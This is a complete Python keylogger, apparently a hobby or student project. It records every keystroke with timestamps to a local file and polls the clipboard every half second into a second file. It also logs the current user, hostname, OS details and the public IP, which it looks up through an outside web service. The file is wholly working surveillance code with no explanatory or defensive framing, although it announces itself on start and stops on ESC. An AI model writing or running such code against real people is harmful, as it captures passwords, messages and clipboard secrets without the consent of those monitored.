# import modules
from pynput import keyboard
import datetime
import pyperclip # For clipboard logging
import time
import threading
import socket # To get hostname info
import platform # To get OS and arch info
import requests # To get public IP
import getpass # To get current logged-in user

# File names
logFile = "log.txt"
clipboardLogFile = "clipboard.txt"
sysInfoFile = "sysinfo.txt"

# Dictionary of special keys that are converted to labels for easier readability in log file
mappedKeys = {
    'Key.space': '[SPACE]',
    'Key.enter': '[ENTER]',
    'Key.backspace': '[BACKSPACE]',
    'Key.tab': '[TAB]',
    'Key.shift': '[SHIFT]',
    'Key.up': '[UP]',
    'Key.down': '[DOWN]',
    'Key.left': '[LEFT]',
    'Key.right': '[RIGHT]',
    'Key.caps_lock': '[CAPSLOCK]',
    'Key.esc': '[ESCAPE]',
    'Key.cmd': '[CMD]',
}

def press(key):
    # gets current timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        # prints typical characters such as letters or numbers
        key = key.char
    except AttributeError:
        # prints special keys such as ctrl or shift, gets converted to string so that it could be logged
        key = str(key)
    # Replace key with mapped label if it's a special key; stays unchanged if not special key
    key = mappedKeys.get(key, key)

    # Opens log file and appends every key pressed as well as its timestamp
    with open(logFile, "a") as file:
        file.write(f"[{timestamp}] {key}\n")

def release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped")
        return False

def clipboard_monitoring():
    clipboard = "" # Tracks whatever is on the clipboard
    while True:
        try:
            current_clipboard = pyperclip.paste()
            # If there are any changes in the contents of the clipboard, log it
            if current_clipboard != clipboard:
                clipboard = current_clipboard
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(clipboardLogFile, "a") as file:
                    file.write(f"[{timestamp}] [Clipboard] {clipboard}\n")
        except Exception:
            pass
        time.sleep(0.5) # Check every half second


def get_system_info():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = getpass.getuser()                # Current user logged in
    hostname = socket.gethostname()         # System hostname
    operating_system = platform.system()    # System OS
    version = platform.release()            # System Version
    architecture = platform.machine()       # System Architecture

    # Tries to get public ip, if it cannot be found, public_ip field will state 'cannot be found'
    try:
        # Gives 10 seconds to get IP before giving up
        public_ip = requests.get("https://api.ipify.org", timeout=10).text
    except:
        public_ip = "Cannot be found"

    # Write all info into log file
    with open (sysInfoFile, "a") as file:
        file.write(f"----- New Logging Session [{timestamp}] -----\n")
        file.write(f"User: {user}\n")
        file.write(f"Hostname: {hostname}\n")
        file.write(f"Operating System: {operating_system}\n")
        file.write(f"OS Version: {version}\n")
        file.write(f"OS Architecture: {architecture}\n")
        file.write(f"Public IP: {public_ip}\n")
        file.write(f"\n")




if __name__ == "__main__":
    print("Keylogger started, press ESC to exit")
    # Clipboard monitoring starts in the background
    threading.Thread(target=clipboard_monitoring, daemon=True).start()
    # Call to get system info
    get_system_info()
    # Start listening for keyboard strokes
    with keyboard.Listener(on_press=press, on_release=release) as listener:
        # listener remains running until release() returns False
        listener.join()


